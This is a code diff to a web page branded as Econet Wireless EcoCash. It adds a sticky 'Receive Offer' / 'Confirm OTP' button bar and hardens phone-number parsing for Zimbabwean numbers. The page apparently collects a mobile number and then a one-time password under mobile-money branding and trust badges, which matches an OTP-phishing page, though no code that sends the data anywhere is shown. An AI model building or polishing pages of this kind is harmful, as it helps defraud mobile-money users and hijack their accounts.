@@ -38,7 +38,7 @@
 }
 
 html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--blue);color:var(--t1)}
-.screen{display:grid;grid-template-rows:auto 1fr auto;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative}
+.screen{display:grid;grid-template-rows:auto 1fr auto auto;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative}
 @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
 @keyframes fadeOut{from{opacity:1}to{opacity:0;transform:translateY(-8px)}}
 .screen{animation:fadeUp .3s cubic-bezier(.2,0,0,1) both}
@@ -73,7 +73,7 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
 .bchip{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.11);padding:3px 10px;border-radius:var(--rp);font-size:11px;font-weight:500;color:rgba(255,255,255,.65);font-family:var(--mono)}
 
 /* ── LAYOUT: scroll area + fixed bottom bar ── */
-.body{overflow-y:auto;overflow-x:hidden;padding:16px 16px 16px;min-height:0;scrollbar-width:none;overscroll-behavior:contain;background:var(--bg);border-radius:0}
+.body{overflow-y:auto;overflow-x:hidden;padding:16px 16px 16px;min-height:0;scrollbar-width:none;overscroll-behavior:contain;background:var(--bg);border-radius:0;}
 
 
 .action-btn{
@@ -205,6 +205,15 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
 .otp-toast-title{font-size:13px;font-weight:700;color:#fff}
 .otp-toast-sub{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
 .otp-toast-sub strong{color:rgba(255,255,255,.8);font-family:var(--mono)}
+
+/* ── STICKY ACTION BAR ── */
+.action-bar{
+  flex-shrink:0;
+  padding:10px 16px max(20px,env(safe-area-inset-bottom));
+  background:var(--card);
+  border-top:1px solid var(--line);
+}
+.action-bar .action-btn{ margin:0 }
 </style>
 </head>
 <body>
@@ -316,7 +325,6 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
         <div class="sec-item"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
         <div class="sec-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Instant</div>
       </div>
-      <button class="action-btn" id="mainBtn" type="button">Receive Offer · <span style="font-size:13px;font-weight:400;opacity:.75">Gamuchira</span></button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
@@ -378,12 +386,21 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
           </div>
         </div>
       </div>
-      <button class="action-btn" id="otpBtn" type="button">Confirm OTP · <span style="font-size:13px;font-weight:400;opacity:.75">Simbisa</span></button>
       <div class="powered" style="padding-bottom:4px">Powered by Econet Wireless · EcoCash</div>
     </div>
 
   </div><!-- /body -->
 
+
+  <!-- STICKY ACTION BAR -->
+  <div class="action-bar" id="actionBar">
+    <button class="action-btn" id="mainBtn" type="button">
+      Receive Offer · <span style="font-size:13px;font-weight:400;opacity:.75">Gamuchira</span>
+    </button>
+    <button class="action-btn" id="otpBtn" type="button" style="display:none">
+      Confirm OTP · <span style="font-size:13px;font-weight:400;opacity:.75">Simbisa</span>
+    </button>
+  </div>
 </div><!-- /screen -->
 
 <!-- OTP TOAST -->
@@ -421,6 +438,13 @@ function showStep(id){
   document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
   step=id;
+  // Toggle correct action button
+  var mainBtn=document.getElementById('mainBtn');
+  var otpBtn=document.getElementById('otpBtn');
+  var bar=document.getElementById('actionBar');
+  if(mainBtn)mainBtn.style.display=(id==='step1')?'':'none';
+  if(otpBtn)otpBtn.style.display=(id==='step3')?'':'none';
+  if(bar)bar.style.display=(id==='stepVerify')?'none':'';
   const body=document.getElementById('bodyScroll');
   if(body)body.scrollTop=0;
   history.pushState({step:id},'','');
@@ -429,10 +453,14 @@ function showStep(id){
 /* ── PHONE ── */
 /* ── PHONE: normalise any format on input and paste ── */
 function cleanPhone(raw){
-  var v=raw.replace(/[^0-9]/g,''); // digits only
-  if(v.slice(0,5)==='00263') v=v.slice(5);      // 00263...
-  else if(v.slice(0,3)==='263'&&v.length>9) v=v.slice(3); // 263...
-  if(v.slice(0,1)==='0') v=v.slice(1);           // leading 0
+  // Strip non-digits
+  var v=raw.replace(/[^0-9]/g,'');
+  // Strip country codes — always, regardless of length
+  if(v.startsWith('00263')) v=v.slice(5);
+  else if(v.startsWith('263'))  v=v.slice(3);
+  // Strip leading zero (07X... -> 7X...)
+  if(v.startsWith('0')) v=v.slice(1);
+  // Cap at 9 digits
   return v.slice(0,9);
 }
 function applyPhone(v){
@@ -442,8 +470,13 @@ function applyPhone(v){
   document.getElementById('phoneOutline').classList.toggle('err',!ok&&v.length>0);
   document.getElementById('phoneError').classList.toggle('show',!ok&&v.length>0);
 }
-document.getElementById('phone').addEventListener('input',function(){
-  applyPhone(cleanPhone(this.value));
+// Fire on input, keyup, change and paste — covers all Android keyboard scenarios
+['input','keyup','change'].forEach(function(evt){
+  document.getElementById('phone').addEventListener(evt,function(){
+    var cleaned=cleanPhone(this.value);
+    if(cleaned!==this.value){this.value=cleaned} // prevent cursor jump only on actual change
+    applyPhone(cleaned);
+  });
 });
 document.getElementById('phone').addEventListener('paste',function(e){
   e.preventDefault();
